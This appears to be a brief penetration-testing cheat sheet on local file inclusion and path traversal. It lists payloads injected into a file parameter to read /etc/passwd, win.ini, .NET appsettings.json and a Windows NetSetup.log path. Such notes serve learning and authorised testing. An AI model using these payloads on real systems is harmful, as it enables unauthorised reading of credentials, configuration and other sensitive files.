
## LFI - file traversal

`../../etc/passwd` 


###  LFI for all the different systems 
- Note not all the systems use .aspx (just notice the parameter to path and file exploitation with the systems)

Common LFI Payloads: If the application takes a file parameter, try injecting payloads that reference sensitive files on the system. For example:

/file.aspx?file=../../../../etc/passwd (for Linux systems)
/file.aspx?file=../../../../windows/win.ini (for Windows systems)
/file.aspx?file=../../../../appsettings.json (for .NET-based apps)

- Windows LFI
  - \\localhost\c$\Windows/debug/NetSetup.log